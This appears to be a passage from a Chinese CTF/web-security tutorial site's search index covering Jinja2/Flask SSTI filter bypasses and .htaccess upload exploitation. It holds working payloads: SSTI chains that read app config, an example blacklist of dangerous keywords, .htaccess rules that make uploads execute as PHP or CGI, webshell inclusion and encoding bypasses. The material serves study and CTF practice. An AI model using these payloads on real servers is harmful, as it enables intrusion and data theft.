<p>\u5b57\u7b26\u4e32\u62fc\u63a5</p> <p>1\u3001\u62fc\u63a5</p> <p>\"cla\"+\"ss\"</p> <p>2\u3001\u53cd\u8f6c</p> <p>\"ssalc\"[::-1]</p> <p>3.ascii\u8f6c\u6362</p> <pre><code>\"{0:c}\".format(97)='a'\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)='__class__'\n</code></pre> <p>4\u3001\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>\"__class__\"==\"\\x5f\\x5fclass\\x5f\\x5f\"==\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\"\u5bf9\u4e8epython2\u7684\u8bdd\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528base64\u8fdb\u884c\u7ed5\u8fc7\uff08\u6240\u4ee5\u6211\u6ca1\u8bb0\u9519\uff09\"__class__\"==(\"X19jbGFzc19f\").decode(\"base64\")\n</code></pre> <p>5.\u5229\u7528chr\u51fd\u6570</p> <p>\u56e0\u4e3a\u6211\u4eec\u6ca1\u6cd5\u76f4\u63a5\u4f7f\u7528chr\u51fd\u6570\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7__builtins__\u627e\u5230\u4ed6</p> <pre><code>{% set chr=url_for.__globals__['__builtins__'].chr %}{{\"\"[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}\n</code></pre> <p>6\u3001\u5728jinja2\u91cc\u9762\u53ef\u4ee5\u5229\u7528~\u8fdb\u884c\u62fc\u63a5</p> <pre><code>{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\n</code></pre> <p>7\u3001\u5927\u5c0f\u5199\u8f6c\u6362</p> <p>\u524d\u63d0\u662f\u8fc7\u6ee4\u7684\u53ea\u662f\u5c0f\u5199</p> <pre><code>\"\"[\"__CLASS__\".lower()]\n</code></pre> <p>\u4ee5\u4e0a\u662f\u5e38\u89c1\u7684\u601d\u8def\u3002\u53ef\u662f\u5047\u8bbe\u6709\u4e00\u5929\uff0c\u4f60\u78b0\u5230\u4e86\u8fd9\u6837\u7684\u73a9\u610f\uff0c\u4f60\u8be5\u600e\u4e48\u505a\uff1f</p> <pre><code>blacklist&lt;/br&gt;   '.','[','\\'','\"',''\\\\','+',':','_',&lt;/br&gt;   'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt;   'eval','exec','os','popen','open','read',&lt;/br&gt;   'select','url_for','get_flashed_messages','config','request',&lt;/br&gt;   'count','length','\uff10','\uff11','\uff12','\uff13','\uff14','\uff15','\uff16','\uff17','\uff18','\uff19','0','1','2','3','4','5','6','7','8','9'&lt;/br&gt;    &lt;/br&gt;\n</code></pre> <p>\u6240\u4ee5\u4e0b\u9762\u8bb2\u4e00\u8bb2\u8fdb\u9636\u64cd\u4f5c\u3002</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#flask_2","title":"FLASK\u8fdb\u9636\u64cd\u4f5c","text":"<p>\u8fd9\u91cc\u7684\u91cd\u70b9\u8fd8\u662f\u8fc7\u6ee4\u5668\u3002</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#_7","title":"\u5168\u5c40\u641c\u7d22\u59ff\u52bf","text":"<p>url_for\u3001g\u3001request\u3001namespace\u3001lipsum\u3001range\u3001session\u3001dict\u3001get_flashed_messages\u3001cycler\u3001joiner\u3001config\u7b49</p> <p>\u5982\u679c\u4e0a\u9762\u63d0\u5230\u7684 config\u3001self \u4e0d\u80fd\u4f7f\u7528\uff0c\u8981\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\uff0c\u5c31\u5fc5\u987b\u4ece\u5b83\u7684\u5168\u5c40\u53d8\u91cf\uff08\u8bbf\u95ee\u914d\u7f6e current_app \u7b49\uff09</p> <pre><code>{{url_for.__globals__['current_app'].config.FLAG}}{{get_flashed_messages.__globals__['current_app'].config.FLAG}}{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\nPython\n</code></pre> <p>\u8fd9\u4e2a\u5c31\u5f88\u7c7b\u4f3c\u662f\u5168\u5c40\u6027\u7684\u641c\u7d22\uff0c\u5c24\u5176\u662furl_for:</p> <p>url_for()\u4f5c\u7528:</p> <p>(1)\u7ed9\u6307\u5b9a\u7684\u51fd\u6570\u6784\u9020 URL\u3002</p> <p>(2)\u8bbf\u95ee\u9759\u6001\u6587\u4ef6(CSS / JavaScript \u7b49)\u3002 \u53ea\u8981\u5728\u4f60\u7684\u5305\u4e2d\u6216\u662f\u6a21\u5757\u7684\u6240\u5728\u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a static \u7684\u6587\u4ef6\u5939\uff0c\u5728\u5e94\u7528\u4e2d\u4f7f\u7528 /static \u5373\u53ef\u8bbf\u95ee\u3002</p> <p>get_flashed_message(\u95ea\u73b0)</p> <p>\u8fd4\u56de\u4e4b\u524d\u5728Flask\u4e2d\u901a\u8fc7 flash() \u4f20\u5165\u7684\u95ea\u73b0\u4fe1\u606f\u5217\u8868\u3002\u628a\u5b57\u7b26\u4e32\u5bf9\u8c61\u8868\u793a\u7684\u6d88\u606f\u52a0\u5165\u5230\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u4e2d\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u7528 get_flashed_messages() \u65b9\u6cd5\u53d6\u51fa(\u95ea\u73b0\u4fe1\u606f\u53ea\u80fd\u53d6\u51fa\u4e00\u6b21\uff0c\u53d6\u51fa\u540e\u95ea\u73b0\u4fe1\u606f\u4f1a\u88ab\u6e05\u7a7a)\u3002</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#_8","title":"\u8fc7\u6ee4\u5668","text":"<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is applied to the next.For example, {{ name|striptags|title }} will remove all HTML Tags from variable name and title-case theoutput (title(striptags(name))).\n\u53d8\u91cf\u53ef\u4ee5\u901a\u8fc7\u8fc7\u6ee4\u5668\u4fee\u6539\u3002\u8fc7\u6ee4\u5668\u4e0e\u53d8\u91cf\u4e4b\u95f4\u7528\u7ba1\u9053\u7b26\u53f7\uff08|\uff09\u9694\u5f00\uff0c\u62ec\u53f7\u4e2d\u53ef\u4ee5\u6709\u53ef\u9009\u53c2\u6570\u3002\u53ef\u4ee5\u94fe\u63a5\u591a\u4e2a\u8fc7\u6ee4\u5668\u3002\u4e00\u4e2a\u8fc7\u6ee4\u5668\u7684\u8f93\u51fa\u5e94\u7528\u4e8e\u4e0b\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002\n\u4f8b\u5982\uff0c{{ name|striptags|title }} \u5c06\u5220\u9664\u53d8\u91cf\u540d\u4e2d\u7684\u6240\u6709HTML\u6807\u8bb0\uff0c\u5e76\u5c06title\u5927\u5c0f\u5199\u4e3a\u8f93\u51fa(title(striptags(name)))\u3002\n</code></pre> <p>\u6545\u540d\u601d\u610f\uff0c\u8fc7\u6ee4\u67d0\u4e9b\u4e1c\u897f\uff0c\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u4e1c\u897f\uff0c\u6216\u8005\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u50cf\u51fd\u6570\u7684\u67d0\u4e2a\u4e1c\u897f\u3002</p> <p>1.attr</p> <p>Get an attribute of an object. foo|attr(\"bar\") works like foo.bar just that always an attribute is returned and items are not looked up.</p> <p>\u83b7\u53d6\u53d8\u91cf\u7684\u503c</p> <pre><code>\"\"|attr(\"__class__\")\u76f8\u5f53\u4e8e\"\".__class__\n</code></pre> <p>2.format</p> <pre><code>\u7528\u6cd5\n{ \"%s, %s!\"|format(greeting, name) }}\n\u90a3\u4e48\u6211\u4eec\u60f3\u8981\u8c03\u7528__class__\u5c31\u53ef\u4ee5\u7528format\u4e86\uff1a\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)=='__class__'\n\"\"[\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)]\n</code></pre> <p>3.first last random</p> <ul> <li>Return the first item of a sequence.</li> <li>Return the last item of a sequence.</li> <li>Return a random item from the sequence.</li> </ul> <p>random\u662f\u80fd\u62ff\u522b\u7684\uff08\u53ea\u662f\u8981\u8dd1\u811a\u672c\uff09\uff0c\u5176\u4ed6\u4e24\u4e2a\u53ea\u80fd\u62ff\u9996\u5c3e</p> <p>4.join</p> <p>\u8fd9\u4e2a\u5c31\u5f88\u5173\u952e\u4e86\uff0c\u975e\u5e38\u91cd\u8981</p> <pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is anempty string per default, you can define it with the optional parameter:\n{{ [1, 2, 3]|join('|') }}    -&gt; 1|2|3\n{{ [1, 2, 3]|join }}    -&gt; 123It is also possible to join certain attributes of an object:\n{{ users|join(', ', attribute='username') }}\n</code></pre> <p>\u770b\u7684\u51fa\u6765\uff0cjoin\u7528\u4ed6\u7684\u53c2\u6570\u4f5c\u4e3a\u524d\u9762\u5217\u8868\u7684\u5206\u9694\u7b26</p> <pre><code>\"\"[['__clas','s__']|join] \u6216\u8005 \"\"[('__clas','s__')|join]\n\u76f8\u5f53\u4e8e\n\"\"[\"__class__\"]\n</code></pre> <p>5.lower</p> <pre><code>\"\"[\"__CLASS__\"|lower]\u5f88\u50cf\u4e4b\u524d\u7684upper()\u51fd\u6570\n</code></pre> <p>6.replace reverse</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u66ff\u6362\u548c\u53cd\u8f6c\u8fd8\u539f\u56de\u6211\u4eec\u8981\u7528\u7684\u5b57\u7b26\u4e32\u4e86</p> <pre><code>\"__claee__\"|replace(\"ee\",\"ss\") \u6784\u9020\u51fa\u5b57\u7b26\u4e32 \"__class__\"\"__ssalc__\"|reverse \u6784\u9020\u51fa \"__class__\"\n</code></pre> <p>7.string</p> <p>\u529f\u80fd\u7c7b\u4f3c\u4e8epython\u5185\u7f6e\u51fd\u6570 str.</p> <p>\u6709\u4e86\u8fd9\u4e2a\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u628a\u663e\u793a\u5230\u6d4f\u89c8\u5668\u4e2d\u7684\u503c\u5168\u90e8\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u518d\u901a\u8fc7\u4e0b\u6807\u5f15\u7528\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u51fa\u4e00\u4e9b\u5b57\u7b26\u4e86\uff0c\u518d\u901a\u8fc7\u62fc\u63a5\u5c31\u80fd\u6784\u6210\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\u3002</p> <pre><code>().__class__   \u51fa\u6765\u7684\u662f&lt;class 'tuple'&gt;(().__class__|string)[0] \u51fa\u6765\u7684\u662f&lt;\n</code></pre> <p>8.select unique</p> <pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.If no test is specified, each object will be evaluated as a boolean.\u901a\u8fc7\u5bf9\u6bcf\u4e2a\u5bf9\u8c61\u5e94\u7528\u6d4b\u8bd5\u5e76\u4ec5\u9009\u62e9\u6d4b\u8bd5\u6210\u529f\u7684\u5bf9\u8c61\u6765\u7b5b\u9009\u5bf9\u8c61\u5e8f\u5217\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u6d4b\u8bd5\uff0c\u5219\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u5c06\u88ab\u8ba1\u7b97\u4e3a\u5e03\u5c14\u503c\nReturns a list of unique items from the given iterable.\n</code></pre> <pre><code>()|select|string\u7ed3\u679c\u5982\u4e0b&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;\n(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]\n\u5f97\u5230\u5b57\u7b26\u4e32\"__class__\"\n</code></pre> <p>9.list</p> <pre><code>\u8f6c\u6362\u6210\u5217\u8868\n\u66f4\u591a\u7684\u7528\u9014\u662f\u914d\u5408\u4e0a\u9762\u7684string\u8f6c\u6362\u6210\u5217\u8868\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u5217\u8868\u91cc\u9762\u7684\u65b9\u6cd5\u53d6\u5b57\u7b26\u4e86\n\u53ea\u662f\u5355\u7eaf\u7684\u5b57\u7b26\u4e32\u7684\u8bdd\u53d6\u5355\u4e2a\u5b57\u7b26\u65b9\u6cd5\u6709\u9650\n</code></pre> <pre><code>(()|select|string|list).pop(0)\n</code></pre> <p>10.lipsum</p> <p>\u8fd9\u4e2a\u662f\u4e4b\u524d\u5b66\u5230\u7684\u59ff\u52bf\u3002</p> <p>Lorem ipsum\uff0c\u4e2d\u6587\u53c8\u79f0\u201c\u4e71\u6570\u5047\u6587\u201d\uff0c\u662f\u6307\u4e00\u7bc7\u5e38\u7528\u4e8e\u6392\u7248\u8bbe\u8ba1\u9886\u57df\u7684\u62c9\u4e01\u6587\u6587\u7ae0[1] \uff0c\u4e3b\u8981\u7684\u76ee\u7684\u4e3a\u6d4b\u8bd5\u6587\u7ae0\u6216\u6587\u5b57\u5728\u4e0d\u540c\u5b57\u578b\u3001\u7248\u578b\u4e0b\u770b\u8d77\u6765\u7684\u6548\u679c\uff0c\u901a\u5e38\u7f51\u7ad9\u8fd8\u6ca1\u5efa\u8bbe\u597d\u65f6\u4f1a\u51fa\u73b0\u8fd9\u6bb5\u6587\u5b57</p> <p>\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u4e5f\u662f\u8d77\u5230\u4e86\u8fd9\u6837\u7684\u4f5c\u7528\uff0c\u4e8e\u662f\u6211\u4eec\u7ed3\u5408lipsum|string|list</p> <p>\u5c31\u80fd\u62ff\u5230\u6211\u4eec\u60f3\u8981\u7684\u6570\u5b57\u3002\u5230\u8fd9\u91cc\uff0c\u90a3\u4e2ablacklist\u5c31\u5e94\u8be5\u662f\u6709\u8db3\u591f\u7684\u65b9\u6cd5\u7ed5\u8fc7\u4e86\u3002</p>"},{"location":"web_bak/upload/htaccess/","title":".htaccess","text":"<p>\u642c\u8fd0\u642c\u8fd0</p> <p>\u524d\u8a00</p> <p>.htaccess\u6587\u4ef6\u662fapache\u670d\u52a1\u5668\u7684\u4e00\u79cd\u76ee\u5f55\u7ea7\u522b\u7684\u4fee\u6539\u914d\u7f6e\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u7528\u6765\u914d\u7f6e\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\uff0c\u5e38\u5e38\u88ab\u7528\u4e8e\u8bbf\u95eeURL\u65f6\u91cd\u5199\u8def\u5f84\uff1b\u5728\u6b64\u603b\u7ed3\u4e00\u4e0b\u76f8\u5173\u5229\u7528\u53cabypass\u7684\u65b9\u5f0f</p> <p>\u6d4b\u8bd5\u73af\u5883\uff1aUbuntu18.04+Apache2+php7.2</p> <p><code>/etc/apache2</code>\u4e0b\u6709\u4e24\u4e2a\u6587\u4ef6\u5939<code>mods-enable</code>\u548c<code>mods-available</code>\uff0c\u5176\u4e2d<code>mods-enable</code>\u91cc\u88c5\u7684\u662fapache\u5df2\u7ecf\u88ab\u542f\u7528\u7684\u6a21\u5757\uff0c<code>mods-available</code>\u91cc\u88c5\u7684\u662f\u5f53\u524d\u7cfb\u7edf\u53ef\u7528\u7684\u6a21\u5757\u5207\u6362\u5230<code>mods-enabled</code>\uff0c\u67e5\u770b<code>php7.2.conf</code>\uff1a</p> <p></p> <p>\u901a\u8fc7FilesMath\u5339\u914d\u6587\u4ef6\u540e\u7f00\uff0c\u5176\u9ed8\u8ba4\u914d\u7f6e\u662f\u5f53\u5339\u914d\u5230<code>phar</code>\u3001<code>php</code>\u3001<code>phtml</code>\u65f6\uff0c\u90fd\u5c06\u5176\u4f5c\u4e3aphp\u6765\u6267\u884c\uff0c\u5176\u4e2dSetHandler\u5c31\u662f\u8bbe\u7f6e\u89e3\u6790\u65b9\u5f0f\u4f8b\u5982\u5728<code>1.phar</code>\u4e2d\u5199\u5165<code>&lt;?=phpinfo();</code>\uff1a</p> <p></p>"},{"location":"web_bak/upload/htaccess/#_1","title":"\u5229\u7528\u65b9\u5f0f","text":""},{"location":"web_bak/upload/htaccess/#1sethandler","title":"1.SetHandler","text":"<p>(1)\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>SetHandler application/x-httpd-php\n</code></pre> <p>\u6b64\u65f6\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u5f53\u505aphp\u89e3\u6790</p> <p></p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u53ef\u4ee5\u5c06\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\u90fd\u5f53\u505a\u6587\u672c\u89e3\u6790\uff0c\u8fd9\u6837\u4fbf\u53ef\u83b7\u5f97\u6587\u4ef6\u6e90\u7801\uff1a</p> <p></p> <p>(2)2020 de1ctf\u7684checkin\u8fd9\u9053\u9898\u76ee\u7684\u5b98\u65b9wp\u4e2d\u63d0\u5230\u4e86\u8fd9\u79cd\u548c\u7b2c(3)\u79cd\u65b9\u5f0f</p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>SetHandler server-status\n</code></pre> <p>\u8fd9\u79cd\u65b9\u5f0f\u5229\u7528\u4e86apache\u7684\u670d\u52a1\u5668\u72b6\u6001\u4fe1\u606f(\u9ed8\u8ba4\u5173\u95ed)\uff0c\u53ef\u4ee5\u67e5\u770b\u6240\u6709\u8bbf\u95ee\u672c\u7ad9\u7684\u8bb0\u5f55(\u767d\u5ad6)</p> <p></p> <p>\u53ef\u6dfb\u52a0\u53c2\u6570<code>?refresh=5</code>\u6765\u5b9e\u73b0\u6bcf\u96945s\u81ea\u52a8\u5237\u65b0(3)\u8fd9\u79cd\u65b9\u6cd5\u6761\u4ef6\u4e3aapache\u52a0\u8f7d\u4e86<code>cgi_module</code>\uff0c\u8fd9\u91cc\u622a\u7684de1ctf checkin\u8fd9\u9053\u9898\u76ee\u7684phpinfo\uff1a</p> <p></p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>Options +ExecCGIAddHandler cgi-script .xx\n</code></pre> <p>\u7f16\u8f911.xx(\u6ce8\u610f\u683c\u5f0f\u6bd4\u8f83\u4e25\u683c)</p> <pre><code>#! /bin/bash\necho Content-type: text/html\necho \"\"\ncat /flag\n</code></pre> <p>\u53ef\u4ee5\u6210\u529f\u6267\u884c\u6700\u540e\u7684\u547d\u4ee4<code>cat /flag</code></p> <p>\u5f53\u7136\uff0c\u5f00\u542f\u4e86fastcgi\u4e5f\u662f\u53ef\u4ee5\u5229\u7528\u7684\uff0c\u8fd9\u91cc\u4e0d\u5217\u4e3e\u4e86\uff0c\u53ef\u53c2\u8003\u6587\u7ae0\uff1a</p> <pre><code>https://www.freebuf.com/vuls/218495.html\n</code></pre>"},{"location":"web_bak/upload/htaccess/#2addtype","title":"2.AddType","text":"<p>AddType\u53ef\u4ee5\u6307\u793a\u6587\u4ef6\u7ba1\u7406\u7cfb\u7edf\uff0c\u5bf9\u6307\u5b9a\u540e\u7f00\u6587\u4ef6\u4ee5\u9009\u5b9a\u7684\u6587\u4ef6\u7c7b\u578b\u89e3\u6790</p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>AddType application/x-httpd-php .a\n</code></pre> <p>\u4fbf\u4f1a\u5c06\u4ee5<code>.a</code>\u4e3a\u540e\u7f00\u7684\u6587\u4ef6\u89e3\u6790\u4e3aphp</p> <p></p>"},{"location":"web_bak/upload/htaccess/#3php_value","title":"3.php_value","text":"<p>\u8fd9\u79cd\u65b9\u5f0f\u53ef\u901a\u8fc7<code>php_value</code>\u6765\u914d\u7f6ePHP\u7684\u914d\u7f6e\u9009\u9879\uff1b\u53e6\u5916<code>php_flag name on|off</code>\u7528\u6765\u8bbe\u5b9a\u5e03\u5c14\u503c\u7684\u914d\u7f6e\u6307\u4ee4</p> <p>\u67e5\u770b\u914d\u7f6e\u53ef\u88ab\u8bbe\u5b9a\u7684\u8303\u56f4\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u53ef\u77e5\uff0c.htaccess\u53ef\u4ee5\u4f7f\u4e24\u79cd\u914d\u7f6e\u6a21\u5f0f\u751f\u6548\uff1a<code>PHP_INI_PREDIR</code>\u548c<code>PHP_INI_ALL</code></p> <p>\u53ef\u67e5\u770bphp.ini\u914d\u7f6e\u9009\u9879\u5217\u8868\uff0c\u4ece\u4e2d\u5bfb\u627e\u53ef\u5229\u7528\u7684\u914d\u7f6e\u9879</p> <p>(1)\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u7684\u4e24\u4e2a\u76f8\u5173\u914d\u7f6e</p> <p><code>auto_prepend_file</code>\uff1a\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u4e3b\u6587\u4ef6\u89e3\u6790\u4e4b\u524d\u81ea\u52a8\u89e3\u6790</p> <ul> <li> <p><code>auto_append_file</code>\uff1a\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u4e3b\u6587\u4ef6\u89e3\u6790\u540e\u81ea\u52a8\u89e3\u6790</p> </li> <li> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> </li> </ul> <pre><code>php_value auto_prepend_file webshell\n</code></pre> <p>\u7f16\u8f91<code>webshell</code>\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>&lt;?=phpinfo();\n</code></pre> <p>\u6b64\u65f6\u968f\u4fbf\u627e\u4e00\u4e2aphp\u6587\u4ef6\u8bbf\u95ee\uff1a</p> <p></p> <p>\u628a.htaccess\u5185\u5bb9\u6539\u4e3a\u4e0b\u9762\u7684\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a</p> <pre><code>php_value auto_append_file webshell\n</code></pre> <p>\u7531\u4e8e\u901a\u8fc7\u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u9009\u9879\u8fdb\u884c\u6587\u4ef6\u5305\u542b\uff0c\u90a3\u4e48\u4fbf\u53ef\u4f7f\u7528\u76f8\u5173\u7684php\u534f\u8bae\u6d41\uff0c\u5982<code>php://filter</code>\uff0c\u53ef\u7528\u6765\u7ed5\u8fc7\u5bf9\u4e00\u4e9b\u5173\u952e\u5b57\u7684\u68c0\u6d4b\uff0c\u4e0b\u9762Bypass\u90e8\u5206\u4f1a\u63d0\u5230</p> <p>(2)\u7ed5\u8fc7preg_math\u7684\u914d\u7f6e</p> <p>\u67e5\u770b\u5b98\u65b9\u6587\u6863\u4e2d\u7684\u76f8\u5173\u914d\u7f6e\uff1a</p> <p></p> <p>\u7f16\u8f91.htaccess\uff1a</p> <pre><code>php_value pcre.backtrack_limit 0php_value pcre.jit 0\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p>"},{"location":"web_bak/upload/htaccess/#4","title":"4.\u5176\u4ed6","text":"<p>(1)\u7981\u7528\u62d2\u7edd\u89c4\u5219\uff0c\u4f7f.htaccess\u53ef\u8bbf\u95ee</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c.htaccess\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\uff1a</p> <p></p> <p>\u90a3\u4e48\u7f16\u8f91.htaccess\u6587\u4ef6\uff0c\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a</p> <pre><code>&lt;Files ~ \"^.ht\"&gt;    Require all granted    Order allow,deny    Allow from all&lt;/Files&gt;\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p> <p>(2)\u76f4\u63a5\u4f7f\u7528.htaccess shell</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a.htaccess\u6587\u4ef6\uff0c\u9996\u5148\u8bbe\u7f6e\u4e86\u7981\u7528\u62d2\u7edd\u89c4\u5219\uff0c\u8fd9\u6837\u4fbf\u53ef\u76f4\u63a5\u8bbf\u95ee\u5230.htaccess\uff1b\u63a5\u7740\u7528<code>SetHandler</code>\u5c06\u6240\u6709\u6587\u4ef6\u4f5c\u4e3aphp\u89e3\u6790\uff0c\u6700\u540e\u5199\u5165php\u4ee3\u7801\uff0c\u5f00\u5934\u7528<code>#</code>\u6ce8\u91ca\u6389\uff0c\u8fd9\u6837\u4fbf\u53ef\u6210\u529f\u89e3\u6790.htaccess\uff0c\u7136\u540e\u89e3\u6790php\uff1a</p> <pre><code>&lt;Files ~ \"^.ht\"&gt; Require all granted Order allow,deny Allow from all&lt;/Files&gt;SetHandler application/x-httpd-php# &lt;?php phpinfo(); ?&gt;\n</code></pre> <p></p> <p>\u76f8\u5173\u7684\u5173\u4e8e.htaccess\u7684shell\uff0c\u53ef\u53c2\u8003github\u4e0a\u4e00\u4e2a\u9879\u76ee\uff1a</p> <pre><code>https://github.com/wireghoul/htshells\n</code></pre>"},{"location":"web_bak/upload/htaccess/#bypass","title":"Bypass\u65b9\u5f0f","text":""},{"location":"web_bak/upload/htaccess/#1","title":"1.\u5173\u952e\u5b57\u68c0\u6d4b","text":"<p>\u65b9\u6cd51</p> <p>\u5982\u679c\u8fc7\u6ee4\u4e86.htaccess\u5e38\u7528\u7684\u5173\u952e\u5b57\uff0c\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u7ebf\u6765\u7ed5\u8fc7\u5bf9\u5173\u952e\u5b57\u7684\u8fc7\u6ee4\uff0c\u53cd\u659c\u7ebf\u540e\u9700\u8981\u52a0\u4e0a\u6362\u884c\u7b26\uff0c\u5e76\u4e14\u53cd\u659c\u7ebf\u524d\u548c\u5173\u952e\u5b57\u65e0\u7a7a\u683c</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>AddType application/x-httpd-php .abc\n</code></pre> <p></p> <p>\u770b\u56fe\u7247\u7684\u8bdd\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u8fd9\u91cc\u7684\u53cd\u659c\u6760\u6709\u70b9\u50cf\u82f1\u6587\u91cc\u9762\u7684-\u8868\u793a\u6362\u884c\u7684\u62fc\u63a5</p> <p>\u65b9\u6cd52</p> <p>\u5982\u679c\u68c0\u6d4b\u4e0d\u80fd\u542b\u6709<code>&lt;?</code>\u7b49php\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6b64\u65f6\u53ef\u5148\u5c06shell\u5b57\u7b26\u4e32\u8fdb\u884c\u7f16\u7801\uff0c\u7136\u540e\u5728\u6587\u4ef6\u5305\u542b\u65f6\u901a\u8fc7<code>php://filter</code>\u89e3\u7801\uff1a</p> <p></p> <p>\u65b9\u6cd53</p> <p>\u901a\u8fc7UTF-7\u3001UTF-16\u7b49\u8fdb\u884c\u7f16\u7801</p> <p></p> <p>\u7f16\u8f91.htaccess\uff1a</p> <pre><code>AddType application/x-httpd-php .aaaphp_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"\n</code></pre> <p>\u4e4b\u540e\u5c06\u540e\u7f00<code>.aaa</code>\u6587\u4ef6\u7684\u5185\u5bb9\u8fdb\u884c\u76f8\u5e94\u7f16\u7801\u5373\u53ef</p>"},{"location":"web_bak/upload/htaccess/#2","title":"2.\u62fc\u63a5\u65e0\u7528\u5b57\u7b26\u4e32","text":"<p>\u65b9\u6cd51</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>#</code>\u6765\u6ce8\u91ca\u6389\u540e\u9762\u62fc\u63a5\u7684\u591a\u4f59\u5185\u5bb9\uff0c<code>#</code>\u9700\u8981\u548c\u524d\u9762\u7684\u5185\u5bb9\u9694\u4e00\u4e2a\u7a7a\u683c\uff0c\u5e76\u4e14<code>#</code>\u53ea\u80fd\u6ce8\u91ca\u4e00\u884c\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u7ebf\u6765\u8f6c\u4e49\u6362\u884c\u7b26\uff0c\u4ece\u800c\u6ce8\u91ca\u591a\u884c\u5185\u5bb9</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a.htaccess\u6587\u4ef6\u662f\u53ef\u4ee5\u751f\u6548\u7684\uff1a</p> <pre><code>AddType application/x-httpd-php .abc #asdf asdf\n</code></pre> <p>\u65b9\u6cd52</p> <p>\u9664\u4e86<code>#</code>\u5916\uff0c<code>0x00</code>\u4e5f\u53ef\u4ee5\u5f53\u6ce8\u91ca\u7b26\uff0c\u4f7f\u7528<code>write.php</code>\u811a\u672c\u5199\u5165.htaccess\uff1a</p> <pre><code>&lt;?php$data = urldecode('AddType application/x-httpd-php .abc%0a%00asdf');file_put_contents('.htaccess', $data);\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> 